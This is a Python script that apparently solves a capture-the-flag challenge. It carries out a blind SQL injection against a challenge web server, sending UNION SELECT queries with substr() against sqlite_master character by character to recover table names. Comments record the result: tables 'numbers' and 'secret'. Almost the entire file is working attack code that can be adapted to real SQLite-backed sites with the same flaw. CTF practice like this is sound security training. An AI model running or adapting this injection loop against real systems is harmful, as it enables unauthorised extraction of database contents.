import requests
import string
import time

# URL of the API or website you want to send a request to

# readable_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!$?#@~%&()*+,-./:;<=>[\\]^_`{|}"
readable_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$@"


base_url = "https://bluehens-blindsql.chals.io/?guess="

i = 0
table_names = [[]]

# Extract number of tables by checking number of first matches

for c in readable_chars:

    sqli = f"3 UNION SELECT tbl_name FROM sqlite_master WHERE type='table' AND substr(tbl_name, 1, 1)='{c}'"


    url = base_url + sqli

    st = time.time()
    # Send a GET request to the URL
    response = requests.get(url)


    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Capture and display the content of the response
        data = response.text

        err = data.split("</code>")[1]
        if err == "Good guess!":
            print("Char Taken: ", c)
            table_names[i].append(c)
        else:
            print("Pass: ", c)
    else:
        print(f"Request failed with status code: {response.status_code}")



print(table_names[i])
table_names.append([])
i += 1


# Extract table names

while i < 30:

    for sub_name in table_names[i - 1]:
        for c in readable_chars:

            sqli = f"3 UNION SELECT tbl_name FROM sqlite_master WHERE type='table' AND substr(tbl_name, 1, {i + 1})='{sub_name + c}'"


            url = base_url + sqli

            st = time.time()
            # Send a GET request to the URL
            response = requests.get(url)


            # Check if the request was successful (status code 200)
            if response.status_code == 200:
                # Capture and display the content of the response
                data = response.text

                err = data.split("</code>")[1]
                if err == "Good guess!":
                    print("Char Taken: ", c)
                    table_names[i].append(sub_name + c)
                    break
                else:
                    print("Pass: ", c)
            else:
                print(f"Request failed with status code: {response.status_code}")

    print(table_names[i])
    table_names.append([])
    i += 1

print("Tables Tree:")
print(table_names)

# [['n', 's'], ['nu', 'se'], ['num', 'sec'], ['numb', 'secr'], ['numbe', 'secre'], ['number', 'secret'], ['numbers'], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], []]

# Tables: numbers, secret